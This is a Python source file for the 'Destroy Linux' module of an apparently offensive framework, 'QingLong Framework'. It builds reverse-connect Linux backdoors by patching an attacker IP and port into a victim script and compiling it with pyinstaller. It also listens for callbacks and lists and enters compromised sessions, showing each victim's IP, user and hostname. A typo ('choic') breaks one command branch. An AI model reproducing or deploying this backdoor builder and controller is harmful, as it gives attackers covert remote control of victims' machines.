import os
import sys
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from DestroyLinux.backdoor_linux import attacker_linux
from AuxiliaryFunctions import MyTable


class DestroyLinux:
    def __init__(self, thread_session):
        self.thread_session = thread_session
        commands = ["back", "show sessions", "enter session ", "show functions", "delete session ", "show params"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux) > \033[0m')
        history = InMemoryHistory()
        while True:
            choice = prompt(formatted_text1, completer=completer, history=history)
            if choice == 'back':
                break
            elif choice == "":
                continue
            elif choice.lower() == 'show functions':
                self.show_functions()
                continue
                # 后门生成
            elif choice == 'show params':
                self.show_params()
                continue
            elif choic.split()[0] == '1':
                # print("Please turn to README.md")
                self.generate_backdoor_linux(choic.split()[1], choic.split()[2], choic.split()[3], choic.split()[4])
                continue
            # 生成后门
            elif choice.split()[0] == '2':
                try:
                    backdoor = attacker_linux.Attacker(choice)
                    print('\033[1;32;32m' + "[+] Backdoor successfully generated!" + '\033[0m')
                    print('\033[1;32;32m' + "[+] Type \"show functions\" to learn more details about the backdoor." + '\033[0m')
                    # 添加启动后门
                    self.thread_session.append(backdoor)
                    continue
                except KeyboardInterrupt:
                    print("exiting......")
                except IndexError:
                    print('\033[1;31;31m' + "[-] wrong command!" + '\033[0m')
                    continue
                except OSError:
                    print('\033[1;31;31m' + "[-] The port is currently occupied.Please try using a different port.Or try again later." + '\033[0m')
                    continue
            # 查看所有会话
            elif choice == 'show sessions':
                headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "local ip" + '\033[0m', '\033[1;34;34m' + "public ip" + '\033[0m', '\033[1;34;34m' + "user" + '\033[0m', '\033[1;34;34m' + "hostname" + '\033[0m', '\033[1;34;34m' + "system info" + '\033[0m']
                data = []
                i = 0
                print("\n" + '\033[1;34;34m' + "sessions" + '\033[0m' + "\n" + '=' * len("sessions") + "\n")
                for t in self.thread_session:
                    session_info = t.info()
                    mydata = list(session_info)
                    mydata.insert(0, str(i))
                    data.append(mydata)
                    i += 1
                MyTable.createTable(headers, data)
            # 进入已有会话
            elif choice.split()[0] == 'enter':
                try:
                    i = int(choice.split()[-1])
                    session = self.thread_session[i]
                    session.start()
                    session.exec()
                except IndexError:
                    print('\033[1;31;31m' + "[-] No such session!" + '\033[0m')
                    continue
                except ValueError:
                    print('\033[1;31;31m' + "[-] wrong command!" + '\033[0m')
                    continue
            # 删除已有会话
            elif choice.split()[0] == 'delete':
                try:
                    i = int(choice.split()[-1])
                    session2 = self.thread_session[i]
                    session2.start()
                    session2.session_close()
                    del self.thread_session[i]
                except IndexError:
                    print('\033[1;31;31m' + "[-] Failed to delete the session because it does not exit." + '\033[0m')
                    continue
                except ValueError:
                    print('\033[1;31;31m' + "[-] wrong command!" + '\033[0m')
                    continue

    def show_params(self):
        print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
        headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
        mydata = [["attacker_ip", "攻击者IP"], ["port", "监听端口"], ["backdoor_name", "后门名称"], ["path", "后门生成的路径"], ["session_id", "后门的id"]]
        MyTable.createTable(headers, mydata)

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "Destroy Linux" + '\033[0m' + "\n" + '=' * len("Destroy Linux") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "Rebound Backdoor Generation", "1 attacker_ip port backdoor_name path", "反弹式后门生成"],
                  ["2", "Monitor the backdoor", "2 attacker_ip port", "后门监听"],
                  ["3", "Sessions", "show sessions", "查看目前已经连接的后门"],
                  ["4", "Enter sessions", "enter session session_id", "进入相应的后门"],
                  ["5", "Delete sessions", "delete session session_id", "删除相应的后门"]]
        MyTable.createTable(headers, mydata)

    # 后门生成函数
    def generate_backdoor_linux(self, ip, port, backdoor_name, path):
        # 利用victim_linux.py的副本生成后门
        command1 = f"cp victim_linux.py victim_linux1.py && sed -i -e 's/19.98.11.9/{ip}/g' -e 's/1998/{port}/g' victim_linux1.py"
        # 1.利用pyinstaller生成后门
        # 2.把生成的后门转移到特定路径
        # 3.删除残留文件
        command2 = f"pyinstaller --onefile --name {backdoor_name} victim_linux1.py && cp dist/{backdoor_name} {path} && rm -r dist build {backdoor_name}.spec victim_linux1.py"
        os.system(command1)
        os.system(command2)
